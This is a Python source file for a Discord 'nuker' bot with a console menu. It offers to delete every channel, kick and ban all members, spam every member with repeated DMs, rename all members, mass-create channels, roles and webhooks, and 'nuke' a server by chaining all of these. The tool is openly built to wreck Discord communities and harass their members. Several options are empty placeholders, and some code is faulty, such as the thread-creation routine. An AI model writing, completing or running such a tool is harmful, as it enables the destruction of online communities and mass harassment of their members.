import discord
from discord.ext import commands
import asyncio
import random
import logging
import aiohttp

# Suppress unwanted logs from discord.gateway and other sources
logging.basicConfig(level=logging.WARNING)  # Suppress DEBUG and INFO logs
discord.utils.logging.basicConfig(level=logging.WARNING)  # Apply to discord logs

def get_bot_token_and_server_id():
    bot_token = input("Please enter your Bot Token: ")
    server_id = int(input("Please enter the Server ID: "))
    return bot_token, server_id

intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.messages = True

bot = commands.Bot(command_prefix='!', intents=intents)

def print_title():
    title = """
\033[92m
  _____  _   _  _   _  _   _  _  __   _  _  __  _  
 / ____|| \ | || \ | || \ | || ||  \ | || |/ / | | 
| |     |  \| ||  \| ||  \| || ||   \| || ' /  | | 
| |     | . ` || . ` || . ` || || . ` ||  <   | | 
| |____ | |\  || |\  || |\  || || |\  || . \  | |____
 \_____| |_| \_||_| \_||_| \_||_||_| \_||_|\_\ |______|
\033[0m
\033[92mMade by Zino\033[0m
"""
    print(title)

async def menu():
    print("\033[92m" + """
┌─────────────────────────────────────────────────────────┐
│ [ 1] Delete all channels       │ [11] Rename server       │
│ [ 2] Create channels           │ [12] Mass create threads │
│ [ 3] Create roles              │ [13] Webhook spammer     │
│ [ 4] Add webhooks              │ [14] Delete webhook      │
│ [ 5] Kick all members          │ [15] Delete all webhooks │
│ [ 6] Ban all members           │ [16] Server info         │
│ [ 7] Unban all members         │ [17] Rename all members  │
│ [ 8] Copy server               │ [18] Execute script      │
│ [ 9] DM all members            │ [19] Nuke server         │
│ [10] Create/delete channels    │                          │
└─────────────────────────────────────────────────────────┘
\033[0m
    """)

    try:
        option = int(input("\033[92mSelect an option (1-19): \033[0m"))
    except ValueError:
        print("\033[91mInvalid option. Please try again.\033[0m")
        await menu()
        return

    guild = bot.get_guild(server_id)
    if guild is None:
        print(
            f"\033[91mThe bot is not connected to the server with ID {server_id}. Please check your Server ID.\033[0m"
        )
        return

    # Map options to functions
    actions = {
        1: delete_all_channels,
        2: create_channels,
        3: create_roles,
        4: add_webhooks,
        5: kick_all_members,
        6: ban_all_members,
        7: unban_all_members,
        8: copy_server,
        9: dm_all_members,
        10: create_and_delete_channels,
        11: rename_server,
        12: mass_create_threads,
        13: webhook_spammer,
        14: delete_webhook,
        15: delete_all_webhooks,
        16: server_info,
        17: rename_all_members,
        18: custom_script,
        19: nuke_server  # Updated action for option 19
    }

    action = actions.get(option)
    if action:
        await action(guild)
    else:
        print("\033[91mInvalid option. Please try again.\033[0m")
        await menu()

async def delete_all_channels(guild):
    print("\033[92m[ Deleting all channels... ]\033[0m")
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"Deleted channel: {channel.name}")
        except discord.errors.HTTPException as e:
            print(f"Could not delete channel: {channel.name} (Reason: {str(e)})")
    await menu()

async def create_channels(guild):
    channel_name = input("Enter name for channels: ")
    try:
        channel_count = int(input("How many channels to create: "))
    except ValueError:
        print("\033[91mInvalid number of channels. Please enter a valid integer.\033[0m")
        await create_channels(guild)
        return

    for _ in range(channel_count):
        await guild.create_text_channel(f"{channel_name}-{random.randint(1000, 9999)}")
    print(f"Created {channel_count} channels.")
    await menu()

async def create_roles(guild):
    role_name = input("Enter name for roles: ")
    try:
        role_count = int(input("How many roles to create: "))
    except ValueError:
        print("\033[91mInvalid number of roles. Please enter a valid integer.\033[0m")
        await create_roles(guild)
        return

    for _ in range(role_count):
        await guild.create_role(name=role_name)
    print(f"Created {role_count} roles.")
    await menu()

async def add_webhooks(guild):
    webhook_name = input("Enter name for webhooks: ")
    try:
        webhook_count = int(input("How many webhooks to create per channel: "))
    except ValueError:
        print("\033[91mInvalid number of webhooks. Please enter a valid integer.\033[0m")
        await add_webhooks(guild)
        return

    for channel in guild.text_channels:
        for _ in range(webhook_count):
            await channel.create_webhook(name=f"{webhook_name}-{random.randint(1000, 9999)}")
    print(f"Added webhooks to channels.")
    await menu()

async def kick_all_members(guild):
    print("\033[92m[ Kicking all members... ]\033[0m")
    for member in guild.members:
        if member != guild.owner:
            try:
                await member.kick(reason='Kicked by bot')
                print(f"Kicked {member.name}")
            except discord.errors.Forbidden:
                print(f"Cannot kick {member.name}")
    await menu()

async def ban_all_members(guild):
    print("\033[92m[ Banning all members... ]\033[0m")
    for member in guild.members:
        if member != guild.owner:
            try:
                await member.ban(reason='Banned by bot')
                print(f"Banned {member.name}")
            except discord.errors.Forbidden:
                print(f"Cannot ban {member.name}")
    await menu()

async def unban_all_members(guild):
    print("\033[92m[ Unbanning all members... ]\033[0m")
    banned_users = await guild.bans()
    for ban_entry in banned_users:
        user = ban_entry.user
        try:
            await guild.unban(user)
            print(f"Unbanned {user.name}")
        except discord.errors.Forbidden:
            print(f"Cannot unban {user.name}")
    await menu()

async def copy_server(guild):
    invite_link = input("Please enter the invite link of the server to copy from: ")
    print(f"Copying server from {invite_link} to {guild.name}...")
    # Placeholder for server copying functionality
    await menu()

async def dm_all_members(guild):
    message = input("Enter message to send to all members: ")
    try:
        message_count = int(input("How many messages to send: "))
    except ValueError:
        print("\033[91mInvalid number of messages. Please enter a valid integer.\033[0m")
        await dm_all_members(guild)
        return

    for member in guild.members:
        if member != bot.user:
            try:
                for _ in range(message_count):
                    await member.send(message)
                    print(f"Sent message to {member.name}")
            except discord.errors.Forbidden:
                print(f"Cannot send message to {member.name}")
    await menu()

async def create_and_delete_channels(guild):
    channel_name = input("Enter base name for channels: ")
    try:
        repeat_count = int(input("How many times to repeat create/delete: "))
    except ValueError:
        print("\033[91mInvalid number of repetitions. Please enter a valid integer.\033[0m")
        await create_and_delete_channels(guild)
        return

    for _ in range(repeat_count):
        new_channel = await guild.create_text_channel(f"{channel_name}-{random.randint(1000, 9999)}")
        await new_channel.delete()
    print(f"Repeatedly created and deleted channels.")
    await menu()

async def rename_server(guild):
    new_name = input("Enter new server name: ")
    await guild.edit(name=new_name)
    print(f"Server renamed to {new_name}.")
    await menu()

async def mass_create_threads(guild):
    print("\033[92m[ Creating threads... ]\033[0m")
    for channel in guild.text_channels:
        for _ in range(5):  # Adjust the number of threads to create
            try:
                await channel.create_text_channel(f"Thread-{random.randint(1000, 9999)}")
                print(f"Created thread in channel {channel.name}")
            except discord.errors.HTTPException as e:
                print(f"Failed to create thread in channel {channel.name}: {str(e)}")
    await menu()

async def webhook_spammer(guild):
    # Placeholder for webhook spammer functionality
    print("\033[92m[ Spamming webhooks... ]\033[0m")
    await menu()

async def delete_webhook(guild):
    webhook_id = input("Enter webhook ID to delete: ")
    try:
        webhook = await guild.fetch_webhook(webhook_id)
        await webhook.delete()
        print(f"Deleted webhook {webhook_id}")
    except discord.errors.HTTPException as e:
        print(f"Failed to delete webhook {webhook_id}: {str(e)}")
    await menu()

async def delete_all_webhooks(guild):
    print("\033[92m[ Deleting all webhooks... ]\033[0m")
    for channel in guild.text_channels:
        webhooks = await channel.webhooks()
        for webhook in webhooks:
            try:
                await webhook.delete()
                print(f"Deleted webhook {webhook.name}")
            except discord.errors.HTTPException as e:
                print(f"Failed to delete webhook {webhook.name}: {str(e)}")
    await menu()

async def server_info(guild):
    print("\033[92m[ Server info: ]\033[0m")
    print(f"Server name: {guild.name}")
    print(f"Member count: {guild.member_count}")
    print(f"Channels: {[channel.name for channel in guild.channels]}")
    print(f"Roles: {[role.name for role in guild.roles]}")
    await menu()

async def rename_all_members(guild):
    new_name = input("Enter new name for all members: ")
    for member in guild.members:
        if member != bot.user:
            try:
                await member.edit(nick=new_name)
                print(f"Renamed {member.name} to {new_name}")
            except discord.errors.Forbidden:
                print(f"Cannot rename {member.name}")
    await menu()

async def custom_script(guild):
    # Placeholder for executing a custom script
    print("\033[92m[ Executing custom script... ]\033[0m")
    await menu()

async def nuke_server(guild):
    print("\033[92m[ Nuking server... ]\033[0m")
    await delete_all_channels(guild)
    await create_channels(guild)
    await create_roles(guild)
    await add_webhooks(guild)
    await kick_all_members(guild)
    await ban_all_members(guild)
    await unban_all_members(guild)
    await copy_server(guild)
    await dm_all_members(guild)
    await create_and_delete_channels(guild)
    await rename_server(guild)
    await mass_create_threads(guild)
    await webhook_spammer(guild)
    await delete_webhook(guild)
    await delete_all_webhooks(guild)
    await server_info(guild)
    await rename_all_members(guild)
    await custom_script(guild)
    print("\033[91mServer nuked.\033[0m")
    await menu()

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name} ({bot.user.id})")
    await menu()

if __name__ == "__main__":
    bot_token, server_id = get_bot_token_and_server_id()
    bot.run(bot_token)
